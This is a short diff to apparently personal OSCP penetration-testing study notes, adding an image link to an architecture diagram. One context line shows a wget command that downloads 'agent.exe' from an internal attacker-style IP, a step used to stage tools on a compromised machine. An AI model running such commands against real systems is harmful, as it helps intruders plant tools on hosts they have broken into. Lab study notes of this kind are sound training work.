@@ -13,6 +13,8 @@ wget http://192.168.45.173/agent.exe -outfile agent.exe
 
 <img src="https://github.com/timrekmlac/Cybersecurity-Study/blob/main/OSCP/images/image.png?raw=true">
 
+![Architecture Diagram](https://raw.githubusercontent.com/timrekmlac/Cybersecurity-Study/main/OSCP/images/image.png)
+
 <internal machine>
 
 
